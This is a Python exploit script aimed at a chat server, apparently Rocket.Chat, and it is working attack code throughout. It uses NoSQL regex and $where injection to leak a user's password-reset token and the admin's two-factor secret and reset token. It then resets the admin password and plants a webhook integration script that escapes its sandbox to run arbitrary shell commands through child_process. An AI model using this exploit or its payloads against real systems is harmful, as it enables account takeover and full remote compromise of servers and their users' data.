#!/usr/bin/python

import requests
import string
import time
import hashlib
import json
import oathtool
import argparse


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	num = list(range(0,10))
	string_ints = [str(int) for int in num]
	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

	while len(token)!= 43:
		for c in characters:
			payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
			time.sleep(0.5)
			if 'Meteor.Error' not in r.text:
				token += c
				print(f"Got: {token}")

	print(f"[+] Got token : {token}")
	return token


def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Password was changed !")


def twofactor(url,email):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)  
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print(f"[+] Succesfully authenticated as {email}")

	# Getting 2fa code
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	code = r.text[46:98]
	print(f"Got the code for 2fa: {code}")
	return code

def admin_token(url,email):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)  
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print(f"[+] Succesfully authenticated as {email}")

	# Getting reset token for admin
	cookies = {'rc_uid': userid,'rc_token': token}
	headers={'X-User-Id': userid,'X-Auth-Token': token}
	payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\'admin\'+%26%26+(()%3d>{+throw+this.services.password.reset.token+})()"}'
	r = requests.get(url+payload,cookies=cookies,headers=headers)
	code = r.text[46:89]
	print(f"Got the reset token: {code}")
	return code


def changingadminpassword(url,token,code):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\",{\\"twoFactorCode\\":\\"'+code+'\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "403" in r.text:
		exit("[-] Wrong token")

	print("[+] Admin password changed !")


def rce(url,code,cmd):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"totp\\":{\\"login\\":{\\"user\\":{\\"username\\":\\"admin\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}},\\"code\\":\\"'+code+'\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"const require = console.log.constructor(\'return process.mainModule.require\')();\\nconst { exec } = require(\'child_process\');\\nexec(\''+cmd+'\');","type":"webhook-incoming"}'
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	data = r.text
	data = data.split(',')
	token = data[12]
	token = token[9:57]
	_id = data[18]
	_id = _id[7:24]

	# Triggering RCE
	u = url + '/hooks/' + _id + '/' +token
	r = requests.get(u)
	print(r.text)
